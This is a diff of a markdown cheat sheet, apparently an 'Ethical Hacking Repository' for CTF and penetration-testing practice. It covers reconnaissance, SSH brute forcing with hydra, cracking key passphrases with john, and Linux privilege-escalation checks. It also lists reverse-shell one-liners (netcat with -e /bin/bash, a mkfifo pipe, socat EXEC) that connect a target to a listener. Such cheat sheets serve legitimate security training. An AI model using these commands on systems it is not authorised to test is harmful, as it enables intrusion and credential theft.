@@ -30,7 +30,7 @@ EHR - Ethical Hacking Repository
 
 ### Automated Active Inf. G.
 
-**nmap**: $ nmap -A -T4 [target_ip] 
+- **nmap**: $ nmap -A -T4 [target_ip] 
 
 # Enumeration/Scanning
 
@@ -54,11 +54,15 @@ EHR - Ethical Hacking Repository
 - Automated Content Discovery:
 
 ```bash
+
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http:/targetsite.com/ 
+
 ```
 
 ```bash 
+
 gobuster -u http://targetsite.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,sh,txt,cgi,html,js,css
+
 ```
 
 ### Subdomain Enumeration
@@ -69,7 +73,7 @@ gobuster -u http://targetsite.com -w /usr/share/wordlists/dirbuster/directory-li
 
 - DNS Bruteforce:
            
-       dnsrecon -d targetsite.com -D /usr/share/wordlists/dnsmap.txt -t std
+      dnsrecon -d targetsite.com -D /usr/share/wordlists/dnsmap.txt -t std
 
 ### Username Enumeration
 
@@ -91,28 +95,44 @@ But you can also exploit the registration form where the "Username already exist
 
 # Gaining Access
 
+## SSH
+
+- After getting SSH usernames try to access the system bruteforcing it:
+
+      hydra -l [username] -P /usr/share/wordlists/rockyou.txt ssh://[ip-address] -v
+
+- If you can get the RSA private key of a user for ssh access: priv_rsa.txt, then you should derive the priv_rsa.hash to crack the passphrase for priv_rsa keygen.
+      
+      python3 ssh2john.py priv_rsa.txt > priv_rsa.hash
+      
+      john --wordlist=/usr/share/wordlists/rockyou.txt priv_rsa.hash
+      
+  Now you must reduce permissions on priv_rsa.txt
+  
+      chmod 400 priv_rsa.txt
+      
+  And then access the system.
+  
+      ssh -i priv_rsa.txt [username]@[ip-address]
+
 ## Getting a reverse shell
 
 - **Netcat**: easy to istantiate but also to lose, requires stabilization:
-
-      ```bash
+      
       On target ---
       $ nc [listener ip] [listener port] -e /bin/bash
       $ mkfifo /tmp/f; nc [listener ip] [listener port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
       
       On listener ---
       $ nc -nlvp [listener port]
-      ```
-
+      
 - **Socat**: stronger but harder syntax, rarely installed, provides stabilized shell (Socat binary available [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true))
 
-      ```bash
       On target ---
       $ socat TCP:[listener ip]:[listener port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
       
       On listener ---
       $ socat TCP-L:[port] FILE:`tty`,raw,echo=0
-      ```
       
 - **Metasploit**: sometimes banned from CTF environments
 
@@ -124,25 +144,25 @@ All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.c
 
 - Check Python version and execute the command
   
-       python -c 'import pty;pty.spawn("/bin/bash")'
+      python -c 'import pty;pty.spawn("/bin/bash")'
     
 - Get access to term commands
 
-       export TERM=xterm
+      export TERM=xterm
     
 - Cntrl + Z
 
-       stty raw -echo; fg 
+      stty raw -echo; fg 
 
 ### rlwrap
 
 - Use rlwrap prepended nc command at the listener
 
-       rlwrap nc -nlvp [port]
+      rlwrap nc -nlvp [port]
 
 - Cntrl + Z
 
-       stty raw -echo; fg
+      stty raw -echo; fg
 
 ## Web Hacking
 
@@ -190,31 +210,32 @@ Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the m
 - User privilege and membership: $ id
 - Users on the system: $ cat /etc/passwd (Check also if it is writable)
 - Existing communications: $ netstat -a; $ netstat -ano
-- Find interesting files:
+- Look for interesting files:
          
-        find / -name flag1.txt 2>/dev/null
+      find / -name flag1.txt 2>/dev/null
          
 - Find writable or executable folders:
-
-      ```bash
+      
       find / -perm -o w -type d 2>/dev/null
-      ```
-      ```bash 
+      
       find / -perm -o x -type d 2>/dev/nul
-      ```
+      
 - Find SUID bit files (Executables with higher privileges):
 
-        find / -perm -u=s -type f 2>/dev/null
+      find / -perm -u=s -type f 2>/dev/null
         
 - Check capabilities
 
-        getcap -r / 2>/dev/null
+      getcap -r / 2>/dev/null
         
 - Check cronjobs
 
-        cat /etc/crontab
+      cat /etc/crontab
         
 - Check for writable folders in $PATH
+- Check hidden files
+
+      find / -name ".*" 2>/dev/null
 
 #### Automated Tools
 
@@ -228,11 +249,27 @@ Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the m
 
 Once identified Kernel version, search for exploits for the kernel version of the target system and then run the snippet.
 
+## FTP Exploitation
+
+Check for anonymous access with "login: anonymous", then once accessed list elements in ftp folder and try to get them by means of "get filename.ext".
+If ftp is set in [passive](https://www.jscape.com/blog/bid/80512/active-v-s-passive-ftp-simplified) mode then switch to active by typing "passive".
+
+## SUID, SUDO, Capabilities exploitation
+
+Get a way to exploit misconfigured linux systems by means of [GTFO bins](https://gtfobins.github.io/)
+
+## Backup scripts exploitation
+
+Check for backup scripts and check for write permissions.
+
+## Docker exploitation
+
+
 
 # Privilege Escalation
 
 # Post-Exploitation
-[GTFO bins](https://gtfobins.github.io/)
+
 
 ## Vulnerabilities
 
